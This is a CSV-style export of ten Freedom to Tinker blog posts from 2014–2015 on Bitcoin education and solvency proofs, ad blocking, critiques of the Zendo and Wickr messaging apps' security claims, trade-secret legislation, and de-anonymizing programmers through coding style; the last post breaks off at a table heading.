"219","2015-08-26","2023-03-24","https://freedom-to-tinker.com/2015/08/26/bitcoin-course-available-on-coursera-textbook-is-now-official/","Earlier this year we made our online course on Bitcoin publicly available — 11 video lectures and draft chapters of our textbook-in-progress, including exercises. The response has been very positive: numerous students have sent us thanks, comments, feedback, and a few error corrections. We’ve heard that our materials are being used in courses at a few universities. Some students have even translated the chapters to other languages. Coursera. I’m very happy to announce that the course is now available as a Princeton University online course on Coursera. The first iteration starts next Friday, September 4. The Coursera version offers embedded quizzes to test your understanding; you’ll also be part of a community of students to discuss the lectures with (about 10,000 15,000 have already signed up). We’ve also fixed all the errors we found thanks to the video editing skillz of the Princeton Broadcast Center folks. Sign up now, it’s free! We’re closely watching ongoing developments in the cryptocurrency world such as Ethereum. Whenever a body of scientific knowledge develops around a new area, we will record additional lectures. The Coursera class already includes one additional lecture: it’s on the history of cryptocurrencies by Jeremy Clark. Jeremy is the ideal person to give this lecture for many reasons, including the fact that he worked with David Chaum for many years. Jeremy Clark lecturing on the history of cryptocurrencies Textbook. We’re finishing the draft of the textbook; Chapter 8 was released today and the rest will be coming out in the next few weeks. The textbook closely follows the structure of the lectures, but the textual format has allowed us to refine and polish the explanations, making them much clearer in many places, in my opinion. I’m excited to announce that we’ll be publishing the textbook with Princeton University Press. The draft chapters will continue to be available free of charge, but you should buy the book — it will be peer reviewed, professionally edited and typeset, and the graphics will be re-done professionally. Finally, if you’re an educator interested in teaching Bitcoin, write to us and we’ll be happy to share with you some educational materials that aren’t yet public."
"220","2016-02-09","2023-03-24","https://freedom-to-tinker.com/2016/02/09/the-princeton-bitcoin-textbook-is-now-freely-available/","The first complete draft of the Princeton Bitcoin textbook is now freely available. We’re very happy with how the book turned out: it’s comprehensive, at over 300 pages, but has a conversational style that keeps it readable. If you’re looking to truly understand how Bitcoin works at a technical level and have a basic familiarity with computer science and programming, this book is for you. Researchers and advanced students will find the book useful as well — starting around Chapter 5, most chapters have novel intellectual contributions. Princeton University Press is publishing the official, peer-reviewed, polished, and professionally done version of this book. It will be out this summer. If you’d like to be notified when it comes out, you should sign up here. UPDATE: The book came out in the summer of 2016, and was the runner up for the 2017 PROSE Award in Computing and Information Sciences, Association of American Publishers. Check it out here. Several courses have already used an earlier draft of the book in their classes, including Stanford’s CS 251. If you’re an instructor looking to use the book in your class, we welcome you to contact us, and we’d be happy to share additional teaching materials with you. Online course and supplementary materials. The Coursera course accompanying this book had 30,000 students in its first version, and it was a success based on engagement and end-of-course feedback. We plan to offer a version with some improvements shortly. Specifically, we’ll be integrating the programming assignments developed for the Stanford course with our own, with Dan Boneh’s gracious permission. We also have tenative plans to record a lecture on Ethereum (we’ve added a discussion of Ethereum to the book in Chapter 10). Finally, graduate students at Princeton have been leading the charge on several exciting research projects in this space. Watch this blog or my Twitter for updates."
"221","2015-09-24","2023-03-24","https://freedom-to-tinker.com/2015/09/24/has-apple-doomed-ads-on-the-web-will-it-crush-google/","Recently Apple announced that, for the first time ever, ad-blocking plugins will be allowed in mobile Safari in iOS 9. There has been a large outpouring of commentary about this, and there seems to be pretty broad agreement on two things: (1) this action on Apple’s part was aimed at Google and (2) for publishers this will be something between terrible and catastrophic. I believe that people are making these assessments based on a lack of understanding of the technical details of what is in fact going on. For the most part, the public does not appreciate the extent to which, when a web browser visits a typical site, the “page” being served comes from multiple parties. Go to a typical e-commerce site, and you will find pixels, trackers, and content from additional servers, from a few to dozens. These produce analytics for the site owner, run A/B tests, place ads, and many other things. There is even a service that knows what size clothing to sell. It is these services that are the target of ad blockers. The reason ad blockers work is that the industry has made a standard method of ad placement, which is trivial to implement for the publishers and e-commerce web sites. Ad serving is fully browser-based, so the publishers have to do nothing more than install a line of code in their html pages that pulls in a javascript file from the ad company’s server. Once the javascript is in the web page, the ad company takes care of the rest: it figures out what ad to display and injects it into the page. Aside from the simplicity for the publisher, this architecture has an additional advantage for the ad company: they can track users as they go from site to site. Since the web page is pulling in a javascript file from the ad company’s server, that site is able to set a permanent cookie on the user’s browser, which will be sent every subsequent time that user goes to any site that uses the services of that ad company. Thus the ad company is able to accumulate lots of data on users, without most people knowing. In some cases, people’s objection is not to the existence of ads per se, but the secret and unaccountable way in which data is collected. It is this architecture however that renders the ad vulnerable to the blocker. In fact, ad blockers have existed for desktop browsers for a long time. So there is nothing really new under the sun, just the growing popularity of the tracker/ad blocking software. If the use of these plugins becomes ubiquitous, only one thing would have to change – the publishers would have to insert the line of code in some way on the server side, and the ad would just look as though it came with the rest of the page. At that point, the browser plugin is useless. What would be the knock-on effects of this? The ad companies no longer have any way to track users as they move around the web. Absent some way on the ad companies’ part to implement a cross-site evercookie (which would be considered unethical and would quickly be blocked by browser authors if discovered), the ad companies will no longer have a way to connect users on one site to users on another. The ads you’d see on a given site could be based solely on the interactions you’ve had with that one site – which would be a boon to privacy. This is a change, for certain, but probably not the apocalypse for publishing it has been made out to be. There will be a rush to develop ad-placement technology for the server side as there was on the client, but when all settles down it will be pretty easy for the publishers to implement. It’s even arguable that in that world of anonymous web surfing, the better web properties would be able to charge higher rates – absent spying on the readers, decisions about the value of ad placements would be based on the demographics of the readers of the site – just as for offline properties. That being said, if you ever reveal your identity to a web site (for example by entering your e-mail address) that site could set a cookie so as to remember who you are. From that point on, information could quietly be sent to the ad server, perhaps storing all the URLs you visit on that site. So, in the end, this change actually may be a boon for Google. If it’s really true that tracking users is so valuable for ad placement, Google has an advantage the other ad companies do not: many millions of users using Gmail and the Chrome browser, both of which Google controls. If you use Google’s e-mail, Google knows what links you are getting sent from advertisers. If you click a link in a Gmail message going to a web site with Google serving ads on the back end, you can arrive at the site with Google already knowing who you are. (This can be done unobtrusively using the http referrer header.) Even if you don’t use Gmail, you may sign in to Chrome to sync your data across devices. This uploads information to Google’s servers so it can be sent to other devices, such as your Android phone. One of the things that can be synced is the browser history. If this is done, Google – and no one else – will have the same information they would have collected with browser cookies. If Apple is looking to damage Google, their plan may backfire. No one else, not even Facebook, has a chance of matching this."
"222","2015-10-26","2023-03-24","https://freedom-to-tinker.com/2015/10/26/provisions-how-bitcoin-exchanges-can-prove-their-solvency/","Millions of Bitcoin users store their bitcoins with online exchanges (e.g. Coinbase, Kraken) which store bitcoins on their customers’ behalf. They present an interface that looks somewhat like an online bank, allowing users to log in and request payments to other users or withdrawals. For many users this approach makes a lot more sense than the traditional approach of storing private keys on your laptop or phone and interacting with the Bitcoin network directly. Online exchanges require no software installation, enable a familiar password-based authentication model, and can guard against the risk of losing funds with a stolen laptop. Online exchanges can also improve the scalability and efficiency of Bitcoin by settling many logical transactions between users without actually moving funds on the block chain. Of course, users must trust these exchanges not to get hacked or simply abscond with their money, both of which happened frequently in the early days of Bitcoin (nearly half of exchanges studied in a 2013 research paper failed). Famously, Mt. Gox was the largest online exchange until 2014 when it lost most of its customers’ funds under murky circumstances. It has long been a goal of the Bitcoin community for exchanges to be able to cryptographically prove solvency—that is, to prove that they still control enough bitcoins to cover all of their customers’ accounts. Greg Maxwell first proposed an approach using Merkle trees in 2013, but this requires revealing (at a minimum) the total value of the exchange’s assets and which addresses the exchange controls. Exchanges have specifically cited these privacy risks as a reason they have not deployed proofs of solvency, relying on trusted audit instead. In a new paper presented this month at CCS (co-authored with Gaby G. Dagher, Benedikt Bünz, Jeremy Clark and Dan Boneh), we present Provisions, the first cryptographic proof-of-solvency with strong privacy guarantees. Our protocol is suitable for Bitcoin but would work for most other cryptocurrencies (e.g. Litecoin, Ethereum). Our protocol hides the total assets and liabilities of the exchange, proving only that assets are strictly greater than liabilities. If desired, the value of this surplus can be proven. Provisions also hides all customer balances and hides which Bitcoin addresses the bank controls within a configurable anonymity set of other addresses on the block chain. The proofs are large, but reasonable to compute on a daily basis (in the tens of GB for a large exchange, computable in about an hour). Best of all, it is very simple and fast for each user to verify that they have been correctly included. We can even extend the protocol to prevent collusion between exchanges. The details are in the paper, the full version of which is now online. While our Provisions protocol removes the privacy concerns of performing a cryptographic proof-of-solvency, there are still some practical deployment questions because the proof requires the exchange to compute using its private keys. Exchanges rightly go to great lengths to protect these keys, often keeping them offline and/or in hardware security modules. Performing a regular solvency proof requires careful thinking about the right internal procedure for accessing these keys. These deployment questions can be solved. We hope that cryptographic proofs of solvency will soon be expected of upstanding exchanges. Incidents like that of Mt. Gox have greatly damaged public perception of the entire Bitcoin ecosystem. While solvency proofs can’t prevent exchange compromises, they would have made Mt. Gox’s troubles public earlier and more clearly. They would also shore up confidence in today’s exchanges which are (presumably) solvent. Taking a step back, solvency proofs are yet another example where we can replace an expensive and trust-laden process in the offline world (financial inspection by a trusted auditor) with a “trustless” cryptographic protocol. It’s always exciting to take a new step in that direction. There remain limits as to what cryptography can do though. Critically, solvency proofs do not create a binding obligation to pay. A malicious exchange could complete a Provisions proof and then immediately abscond with all of the money. For this reason, some form of government regulation of online exchanges makes sense. Though regulation is dreaded by many in the Bitcoin community, it appears to be on the horizon. Bills have been proposed in several states, largely aimed at exchanges. Interestingly, the model regulatory framework proposed by the Conference of State Bank Supervisors in September already mentions cryptographic solvency proofs as a means of demonstrating solvency. We hope this recommendation is enacted in law and solvency proofs are a tool to avoid the cost of the heavyweight auditing requirements traditionally demanded of banks, while simultaneously increasing transparency for exchange customers."
"223","2015-03-25","2023-03-24","https://freedom-to-tinker.com/2015/03/25/be-wary-of-one-time-pads-and-other-crypto-unicorns/","Yesterday, a new messaging app called Zendo got some very favorable coverage from Tech Crunch. At the core of their sales pitch is the fact that they use one-time pads for encryption. With a few strong assumptions, namely that the pads are truly random and are only used once, it’s true that this scheme is “unbreakable” or more precisely that it offers information-theoretic guarantees that no eavesdropper can learn anything about the encrypted message. Zendo’s founder calls it a “crypto unicorn” and claims it is a game-changer in terms of security. It isn’t. In this post I’ll explain why we don’t need (and shouldn’t want) to use one-time pads for a consumer secure-messaging app and why we should generally be wary of products like Zendo making grandiose claims about solving security problems through magic crypto. The one-time pad is very old and is quite simple: the sender and receiver agree on a random key or “pad” K, which is as long as the message M to be sent, and then the sender transmits a ciphertext C = M ⊕ K. Because there is a possible value of K that would map C to every possible message M (of the given length, which is revealed), it’s easy to prove that no information about M can be obtained if an eavesdropper has no information about K. By contrast, with a stream cipher (one of two common types of symmetric cipher) the sender would transmit C = M ⊕ F(K) for some function F which takes a constant-sized key K and expands it to a “stream” of bytes as long as M. The function F is designed to produce output that appears completely random, but there’s always a chance that the function F will produce output with some statistical bias and this can leak information about the encrypted message M. This has happened with RC4 over the years to the point that it’s no longer recommended. It’s important to keep in mind that there are hundreds of things that can go wrong in a secure messaging app, ranging from entropy failures to backdoored devices to malware. One risk, which is a relatively low-priority one, is that the ciphers or other symmetric primitives will be broken. Removing this reliance on secure symmetric primitives is all the one-time pad can get you in a perfect world. Professional cryptographers would mostly say this is not a risk worth worrying about: RC4 is almost 30 years old now, and despite it being “broken” practical attacks still require enormous amounts of ciphertext and would probably not affect security in a meaningful way if you deployed it in a messaging app. Anyway, one might say that if Zendo have really figured out how to make one-time pads practical, it’s worth using them just to remove this remote risk of a symmetric primitive break. We don’t know exactly how Zendo works, as there is no source code or design documentation available. But there’s the critical thing: As apparently implemented by Zendo, and as would be likely to be implemented by any other mobile messaging app, the use of one-time pads does not remove the reliance on symmetric crypto primitives. There are three reasons for this: Using one-time pads requires generating a lot of true random data and most mobile devices can’t do that. True randomness is very slow to generate for most devices without a special-purpose hardware RNG. As a result, in practice most personal computers and mobile devices have to “stretch” the limited amount of true randomness collected in an entropy pool like Linux’s /dev/urandom. This is done by by a cryptographic pseudorandom number generator, which is of course built using hash functions and is insecure if they’re broken. Zendo apparently uses Java SecureRandom. A reasonable choice, but not appropriate for generating one-time pads. In practice, most devices can’t afford to generate a truly-random one-time pad and use a pseudorandom one, which is equivalent security-wise and worse performance-wise than just having used a stream-cipher to begin with. We don’t have secure high-bandwidth channels for sharing one-time pads which don’t rely on symmetric cryptography. Before using the one-time pad, both users need to get a copy of it. With an app like Zendo, this requires an in-person meeting and taking a picture of a 2D barcode on the other person’s screen. The claim is that this “visual channel” cannot be eavesdropped on. This is a somewhat dubious claim-if anybody gets a picture of your screen during the exchange, they’ll be able to read all of your communication with that partner. It’s important to note that this is NOT a vulnerability for public-key verification using 2D barcodes as many other apps use, an attacker observing this process can’t break your security, so Zendo’s design seems to introduce a new vulnerability here. Anyway, even assuming this visual channel is secure, it’s not high-bandwidth enough to send a large amount of random data for one-time pads. What Zendo does under the hood is share an AES-256 key using the visual channel, then use this to encrypt the one-time pad data and send that electronically (not clear exactly which channel but this doesn’t really matter). So once again, this scheme depends inherently on a symmetric primitive (namely AES-256). If somebody can break AES, they can eavesdrop on the one-time pad exchange. One-time pads don’t assure integrity. It’s easy to flip bits in a transmitted ciphertext which was encrypted using a one-time pad (or stream cipher),which will result in the recipient decoding a message with the corresponding bits also flipped. Preventing this requires a MAC function, and the Zendo developers used the standard HMAC (they didn’t say which hash function but SHA-256 is a safe guess). Again a reasonable choice, only this is yet another symmetric primitive that can compromise security if broken. Unlike the first two issues, this is actually not a fundamental problem, just a classic design error often found in amateur-hour cryptography. One-time MACs exist and they are acceptably efficient, they’re just rarely used because eliminating reliance on symmetric primitives is usually not a design goal. So, don’t believe the hype on Zendo and, in general, ignore any app claiming to use one-time pads. Problems 1 and 2 above are quite hard to address without relying on good symmetric crypto (as Zendo definitively does) at which point there’s no security advantage to using a one-time pad. There’s a reason why you rarely see one-time pads used or even mentioned-professional cryptographers know they aren’t actually adding any security value. They are cloak-and-dagger stuff for a reason, making sense if a spy needs to quickly dead drop a large amount of key material and then wants an encryption algorithm so simple it can be performed on pencil and paper. In general, crypto primitives are not the first thing consumers should be worried about when choosing an encryption app. More important are a clear and properly-documented crypto design that has been subject to independent review, source code available for review, regular audits for implementation security, forward secrecy and a usable way to verify communication partner’s identities. These are the basic elements highlighted in the EFF’s Secure Messaging Scorecard. As Edward Snowden said “crypto works.” We don’t need crypto unicorns so much as we need diligent engineering to deploy the crypto we already have. More broadly, there is an increasing amount of snake oil in the secure messaging space (some of which has been debunked here before). One-time pads are a classic warning sign, but I’d propose as an even more general rule of thumb: If a new crypto tool is first announced in a press release or popular science magazine, don’t use it. Security and crypto are hard to get right, as everybody in the field painfully knows. New projects which are designed by people with sufficient expertise and experience are almost always circulated on mailing lists, have design docs and code distributed, or have academic papers published for a long time to get sufficient review before they go to the press or encourage real users to sign up. Compare Zendo’s launch to that of Pond, which has been in development for years without any publicity outside of the security community and with active warnings that it isn’t advisable to use it yet because it hasn’t received enough security review. It’s possible a brilliant stealth-mode app could launch with marketing first and security details and review later, but this almost always is a sign that the developers don’t understand how reliable crypto tools come into existence."
"224","2014-06-02","2023-03-24","https://freedom-to-tinker.com/2014/06/02/wickr-putting-the-non-in-anonymity/","[Let’s welcome new CITP blogger Pete Zimmerman, a first-year graduate student in the computer security group at Princeton. — Arvind Narayanan] Following the revelations of wide-scale surveillance by US intelligence agencies and their allies, a myriad of services offering end-to-end encrypted communications have cropped up to take advantage of the increasing demand for privacy from surveillance. When coupled with anonymity, end-to-end encryption can prevent a central service provider from obtaining any information about its users or their communications. However, maintaining anonymity is difficult while simultaneously offering a straightforward way for users to find each other. Enter Wickr. This startup offers a simple app featuring “military grade encryption” of text, photo, video, and voice messages as well as anonymous registration for its users. Wickr claims that it cannot identify who has registered with the service or which of its users are communicating with each other. During registration, users enter their email address and/or phone number (non-Wickr IDs). The app utilizes a cryptographic hash function (SHA-256 in this case) to obtain “anonymous” Wickr IDs from the non-Wickr IDs. Wickr IDs are then stored server-side and used for discovery. When your friends want to find you, they enter your phone number or email address, which is then put through the same hash function, resulting in the same output (Wickr ID). Wickr looks this up in its database to determine if you’ve registered with the service to facilitate message exchange. This process simplifies the discovery of other users, supposedly without Wickr having the ability to identify the users of the anonymous service. The problem here is that while it’s not always possible to determine the input to a hash function given the output, we can leverage the fact that the same input always yields the same output. If the number of possible inputs is small, we can simply try all of them. Unfortunately, this is a recurring theme in a variety of applications as a result of misunderstanding cryptography — specifically, the fact that hash functions are not one-way if the input space is small. A great explanation on the use of cryptographic hash functions in attempts to anonymize data can be found here. With this in mind, let’s consider how difficult it is for Wickr to uncover who its users are (or how difficult it is for somebody else who has obtained the list of Wickr IDs by a court order or compromising Wickr’s servers). Since there are less than 10^10 possible phone numbers in North America, a consumer-grade desktop with a decently powered GPU can compute the hash for all of them in a matter of seconds[1, 1a]. Precomputing and indexing the hashes for all possible phone numbers ahead of time allows the search to complete almost instantaneously (using up to 320 GB of storage, though this could be significantly compressed via a “time-memory trade off”). Similarly, one could precompute the hashes of email addresses from a list obtained through a variety of sources (legitimate or otherwise) and conduct a dictionary attack. These attacks are similar to password cracking, suggesting Wickr could potentially mitigate this problem through the use of two defensive techniques: hash strengthening and salting. The former involves computing an iterated SHA-256 with N iterations to compute a Wickr ID from sensitive information. Unfortunately the numbers don’t appear to work here. If N=10^5, this isn’t enough to really make brute-force infeasible. It would take days on a single machine instead of seconds, but this still can be done in parallel quite cheaply and quickly (e.g., using an Amazon GPU instance runs in the ballpark of $0.7 per hour, per instance). Yet this would probably make Wickr’s contact discovery feature unacceptably slow to use on mobile devices. Given that an average smartphone can compute around 10^6 SHA-256 hashes per second[2], computing the Wickr ID in this manner for each entry in a user’s contact list would induce a noticeable delay while additionally draining the battery. Salting, on the other hand, does not work for contact discovery at all. If Wickr were to add a random salt to each non-Wickr ID before hashing, it’s not possible to store the salt in a way that can be looked up given the ID. Salting works for password hashing because there is a separate username and password; the salt can be looked up given the username and then used for computing the password hash. Wickr has definitively not solved the hard problem of anonymous registration or contact discovery — critical components which, if made cumbersome, could potentially hinder user adoption (and sink a startup). Many other communication tools punt on this problem as well, resorting to painful methods of out-of-band communication and stunting growth. However, including this feature through the misguided use of one-way hashes and misleading marketing claims only lulls Wickr users into a false sense of security. [1] The North American Numbering Plan contains invalid and reserved prefixes. This would reduce the search space by several billion; thus, my estimate provides an upper bound on the time to complete the attack. [1a] oclHashcat is a popular library for GPU-based password brute-forcing which provides our benchmarks on SHA-256 computation speed using a graphics card. [2] https://en.bitcoin.it/wiki/Mining_hardware_comparison#Other"
"225","2015-11-17","2023-03-24","https://freedom-to-tinker.com/2015/11/17/new-professors-letter-opposing-the-defend-trade-secrets-act-of-2015/","As Freedom to Tinker readers may recall, I’ve been very concerned about the problems associated with the proposed Defend Trade Secrets Act. Ostensibly designed to combat cyberespionage against United States corporations, it is instead not a solution to that problem, and fraught with downsides. Today, over 40 colleagues in the academic world joined Eric Goldman, Chris Seaman, Sharon Sandeen and me in raising a variety of concerns about the DTSA in the following letter: Professors’ Letter in Opposition to the Defend Trade Secrets Act of 2015. Importantly, this new letter incorporates our 2014 opposition letter. As we explained, While we agree that effective legal protection for U.S. businesses’ legitimate trade secrets is important to American innovation, we believe that the DTSA—which would represent the most significant expansion of federal law in intellectual property since the Lanham Act in 1946—will not solve the problems identified by its sponsors. Instead of addressing cyberespionage head-on, passage of the DTSA is likely to create new problems that could adversely impact domestic innovation, increase the duration and cost of trade secret litigation, and ultimately negatively affect economic growth. Therefore, the undersigned call on Congress to reject the DTSA. We also call on Congress to hold hearings “that focus on the costs of the legislation and whether the DTSA addresses the cyberespionage problem that it is allegedly designed to combat. Specifically, Congress should evaluate the DTSA through the lens of employees, small businesses, and startup companies that are most likely to be adversely affected by the legislation.” I will continue to blog on the DTSA as events warrant, and encourage Freedom to Tinker readers to contact their members of Congress and urge them to vote against the DTSA."
"226","2014-08-27","2023-03-24","https://freedom-to-tinker.com/2014/08/27/the-dangers-of-the-new-trade-secrets-acts/","First, I want to state how thrilled I am to be joining the great group here at CITP. Every CITP scholar that I’ve gotten to know over the past several years have become friends and influenced my work in areas ranging from voting machine code access to international lawmaking processes. I’m delighted to be a part of CITP’s dynamic team and environment and look forward to an exciting year. Now, on to business. Congress is actively considering legislative responses to increased foreign cyber-espionage, driven by the perception that theft is increasing both in scale and in severity. Two bills – the “Defend Trade Secrets Act of 2014” (“DTSA“) and the “Trade Secrets Protection Act of 2014” (“TSPA“) – are the latest attempts at legislating in this area. The bills both create a new private cause of action under the Economic Espionage Act (“EEA”) for theft of commercially-valuable secret information. Currently, trade secret misappropriation is a federal crime under the EEA, but trade secret owners can seek civil remedies only in state courts, under state laws. The theory underlying the Acts is that a private cause of action under the EEA will be an effective weapon against foreign cyber-espionage. Current law, so the argument goes, is ineffective in combating cyber-espionage. Unfortunately, the bi-partisan sponsors of the Acts have gotten this one wrong. In reality, the Acts will create or exacerbate many existing legal problems, yet solve none. As such, Sharon Sandeen and I authored the linked letter in opposition to the sponsors of the Acts and Congress, which has been signed by 31 United States legal academics. While acknowledging that the United States needs to increase protection against cyber-espionage, we assert that, in sum, the Acts should be rejected for five primary reasons: Effective and uniform state law already exists. The Uniform Trade Secrets Act (“UTSA”) has been adopted by 47 of the 50 states, and state trade secret law has developed through over 100 years of case law. State trade secret law is well-established and substantially uniform. The Acts would undermine this uniformity for no perceivable benefit. Weakened uniformity, as well as parallel, redundant, and damaging law. Because Congress’s power is limited by the Commerce Clause, the Acts only apply the new cause of action to trade secrets “related to a product or service used in or intended for use in, interstate or foreign commerce,” making the scope of the proposed laws unclear and unsettled. Of significant concern is that the Acts include provisions concerning preservation of evidence and seizure of property that overlap with the provisions already made in these areas by the Federal Rules of Civil Procedure. Adding new federal law in this area will lead to confusion. The Acts seek to remedy a perceived problem of varying state law, but in reality will decrease the uniformity of trade secret law and will make legal results less predictable. Anti-competitive results. Under the Acts, injunctions are not limited explicitly to the critical period of lead-time advantage, meaning that they could be extended interminably. In addition, the seizure provisions of the Acts permit seizures to be made before the defendant has notice or an opportunity to be heard. These provisions seem eerily similar to provisions in the failed Stop Online Piracy Act (SOPA) and herald an unprecedented level of judicial secrecy. Increased risk of accidental disclosure of trade secrets. The jurisdictional confusion noted above makes motions to dismiss for lack of subject matter jurisdiction more likely, requiring plaintiff disclosures of trade secrets at earlier stages in the life of a case. Though these disclosures are confidential, they raise the risk of accidental, wider disclosures (as evidenced by the common plaintiff strategy during litigation today of delaying the disclosure of trade secrets to the court as long as possible). Again, no countervailing benefit ameliorates this risk. Negative ancillary impacts on access to information, collaboration among businesses, and mobility of labor. Labeling information as a trade secret can serve as a powerful excuse for withholding critical information from the public and regulators (see, for example, the voting machine code mentioned in my introduction). The existence of even a weak but new cause of action will have a chilling effect on the ability of governments to request trade secret information, and it will be an additional weapon for trade secret holders to wield in refusing to share such information with the public and even regulators. The threat of misappropriation lawsuits will also reduce business collaboration. Finally, unlike state law, the Acts do not protect employee mobility, a critical element in the continued growth and sustainability of an innovation economy. We welcome your questions and responses. Please feel free to comment or to contact Sharon Sandeen ( *protected email*) or me ( *protected email*)."
"227","2015-12-29","2023-03-24","https://freedom-to-tinker.com/2015/12/29/when-coding-style-survives-compilation-de-anonymizing-programmers-from-executable-binaries/","In a recent paper, we showed that coding style is present in source code and can be used to de-anonymize programmers. But what if only compiled binaries are available, rather than source code? Today we are releasing a new paper showing that coding style can survive compilation. Consequently, we can utilize these stylistic fingerprints via machine learning and de-anonymize programmers of executable binaries with high accuracy. This finding is of concern for privacy-aware programmers who would like to remain anonymous. Update: Video of the talk at the Chaos Communication Congress How to represent the coding style in an executable binary. Executable binaries of compiled source code on their own are difficult to analyze because they lack human readable information. Nevertheless reverse engineering methods make it possible to disassemble and decompile executable binaries. After applying such reverse engineering methods to executable binaries, we can generate numeric representations of authorial style from features preserved in binaries. We use a dataset consisting of source code samples of 600 programmers which are available on the website of the annual programming competition Google Code Jam (GCJ). This dataset contains information such as how many rounds the contestants were able to advance, inferring their programming skill, while all contestants were implementing algorithmic solutions to the same programming tasks. Since all the contestants implement the same functionality, the main difference between their samples is their coding style. Such ground truth provides a controlled environment to analyze coding style. We compile the source code samples of GCJ programmers to executable binaries. We disassemble these binaries to obtain their assembly instructions. We also decompile the binaries to generate approximations of the original source code and the respective control flow graphs. We subsequently parse the decompiled code using a fuzzy parser to obtain abstract syntax trees from which structural properties of code can be derived. These data sources provide a combination of high level program flow information as well as low level assembly instructions and structural syntactic properties. We convert these properties to numeric values to represent the prevalent coding style in each executable binary. We cast programmer de-anonymization as a machine learning problem. We apply the machine learning workflow depicted in the figure below to de-anonymize programmers. There are three main stages in our programmer de-anonymization method. First, we extract a large variety of features from each executable binary to represent coding style with feature vectors, which is possible after applying state-of-the-art reverse engineering methods. Second, we train a random forest classifier on these vectors to generate accurate author models. Third, the random forest attributes authorship to the vectorial representations of previously unseen executable binaries. The contribution of our work is that we show coding style is embedded in executable binaries as a fingerprint, making de-anonymization possible. The novelty of our method is that our feature set incorporates reverse engineering methods to generate a rich and accurate representation of properties hidden in binaries. Results. We are able to de-anonymize executable binaries of 20 programmers with 96% correct classification accuracy. In the de-anonymization process, the machine learning classifier trains on 8 executable binaries for each programmer to generate numeric representations of their coding styles. Such a high accuracy with this small amount of training data has not been reached in previous attempts. After scaling up the approach by increasing the dataset size, we de-anonymize 600 programmers with 52% accuracy. There has been no previous attempt to de-anonymize such a large binary dataset. The abovementioned executable binaries are compiled without any compiler optimizations, which are options to make binaries smaller and faster while transforming the source code more than plain compilation. As a result, compiler optimizations further normalize authorial style. For the first time in programmer de-anonymization, we show that we can still identify programmers of optimized executable binaries. While we can de-anonymize 100 programmers from unoptimized executable binaries with 78% accuracy, we can de-anonymize them from optimized executable binaries with 64% accuracy. We also show that stripping and removing symbol information from the executable binaries reduces the accuracy to 66%, which is a surprisingly small drop. This suggests that coding style survives complicated transformations. Other interesting contributions of the paper. By comparing advanced and less advanced programmers’, we found that more advanced programmers are easier to de-anonymize and they have a more distinct coding style. We also de-anonymize GitHub users in the wild, which we explain in detail in the paper. These promising results are encouraging us to extend our method to large real world datasets of various natures for future work. Why does de-anonymization work so well? It’s not because the decompiled source code looks anything like the original. Rather, the feature vector obtained from disassembly and decompilation can be used to predict, using machine learning, the features in the original source code — with over 80% accuracy. This shows that executable binaries preserve transformed versions of the original source code features. I would like to thank Arvind Narayanan for his valuable comments."
"228","2015-02-26","2023-03-24","https://freedom-to-tinker.com/2015/02/26/we-can-de-anonymize-programmers-from-coding-style-what-are-the-implications/","In a recent post, I talked about our paper showing how to identify anonymous programmers from their coding styles. We used a combination of lexical features (e.g., variable name choices), layout features (e.g., spacing), and syntactic features (i.e., grammatical structure of source code) to represent programmers’ coding styles. The previous post focused on the overall results and techniques we used. Today I’ll talk about applications and explain how source code authorship attribution can be used in software forensics, plagiarism detection, copyright or copyleft investigations, and other domains. Security vs. privacy. Identifying the authors of source code is a security-enhancing method that has applications in software forensics. Most of the post will focus on these applications. But before getting to that, I should mention that it is a double-edged sword. Security-enhancing techniques are often also privacy infringing, depending on how they’re used. For example, Iranian citizen Saeed Malekpour was sentenced to death because he was identified as the software developer of an adult entertainment website. Stylometry would be equally applicable in cases like this. Increased awareness of such security-enhancing and privacy infringing methods lead to demand for counteracting privacy-enhancing methods, such as programmer de-anonymization evasion tools. Identifying the properties of individual coding style could be used to modify these to anonymize coding with respect to a set of programmers. Such a tool could give suggestions to completely anonymize a programmer within a set or imitate another programmer’s coding style. It could aid programmers such as Bitcoin’s Satoshi, who would like to remain anonymous in open source projects. This won’t be easy, though. We wondered if running source code through existing code obfuscation tools would be sufficient to anonymize coding style. But we found that Stunnix, the off-the-shelf commercial obfuscator we used, did not change the functionality of code while obfuscating, and preserved the structure. Consequently, our programmer de-anonymization method is impervious to obfuscators that do not modify the structure of source code. Detecting ghostwritten code. Ghostwriting is a type of plagiarism. Say a freshman student’s performance on programming assignments suddenly improved, and we suspect that someone else is writing his code, perhaps a sophomore who took the class the previous year. There are many plagiarism detection tools like Moss that measure code similarity. But in our example, the assignments are all different this year and as a result code similarity comparison is of no help to detect ghostwriting. Stylometry is still relevant though. We could find the owner of the stylistically most similar code from the previous year, and call in that student as well as the freshman for gentle questioning. Another example of ghostwriting is the strange case of an employee found outsourcing his tasks. An employee’s performance or coding skills might change all of a sudden and we might suspect that he is outsourcing his code. We do not know where he is outsourcing but we see a significant difference in his coding ability. We could take this employee’s code before and after we notice the change and see if there’s a sharp difference in coding style. If that turns out to be the case, a deeper investigation could be carried out. Disputed code authorship. Source code author identification could automatically deal with code copyright disputes without requiring manual analysis by a code investigator. A copyright dispute on code ownership can be resolved by comparing the styles of both parties claiming to have generated the code. Style comparison along with copyright information can be extended to automatically detect copyright conflicts. New source code releases can be compared to a code repository that has copyright and author information to automatically detect potential infringements. Identifying intruders and malware authors. The applications discussed so far can be achieved using our techniques today, but there are also more speculative applications if the tools continue to improve. Consider the forensic task of examining the artifacts on a system after an intrusion to obtain evidence for a criminal prosecution. Often, the attacker leaves behind code after an intrusion, either a backdoor or a payload. If we are able to identify the code’s author — for example, by a stylistic comparison of the code with various authors in online code repositories — it may give us clues about the adversary’s identity. A careful adversary may only leave binaries, but a less careful one may leave behind source code or code written in a scripting language. Even more speculatively, there is the possibility that elements of coding style may be preserved in compiled binaries. This would enhance our ability to track the origins of malware. Application to software engineering. Code stylometry can also provide insights for software engineering. We took source code from different Google Code Jam rounds to investigate coding style variations in levels of programming difficulty. We found that programmers’ coding styles became more distinct while implementing more challenging functionality. Further, advanced programmers have a more unique coding style compared to less advanced programmers. We found this by comparing contestants who were able to complete difficult rounds and who could not complete easier rounds. We also discovered that coding style is preserved to some degree over the six years spanned by our dataset. Software engineering aspects of identifying programmer’s coding style could aid companies in automating the recruitment process of programmers with coding style considered to be superior. Software engineering researchers could use code stylometry to analyze stylistic properties of code that has a higher rate of bugs. We could create a dataset with code that is known to include bugs and code without any incidence of bugs to differentiate between their stylometric features. This would aid in creating a classifier that automatically predicts how buggy a piece of code is likely to be. Summary of results. While the applications discussed above are conceptually similar, they correspond to slightly different machine learning problems, so the level of accuracy achieved with our techniques will be different. The following table summarizes our results on some settings we examined on our Google Code Jam dataset. Application 